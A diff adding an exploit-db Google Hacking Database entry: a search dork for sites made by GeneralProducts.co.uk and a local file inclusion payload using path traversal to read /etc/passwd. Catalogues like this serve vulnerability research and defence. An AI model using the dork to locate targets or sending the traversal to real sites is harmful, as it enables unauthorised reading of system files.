@@ -1,0 +1,9 @@
+GHDB URL:         https://www.exploit-db.com/ghdb/3616
+Category:         Advisories and Vulnerabilities
+Published Date:   2010-11-25
+Author:           anonymous
+GoogleDork:       "Site produced by GeneralProducts.co.uk"
+Description:      "Site produced by GeneralProducts.co.uk"
+
+
+GeneralProducts (index.php?page=) Local File Inclusion Vulnerability http://server/index.php?page=../../../../../../etc/passwd Net.Edit0r - black.hat.tm@gmail.com
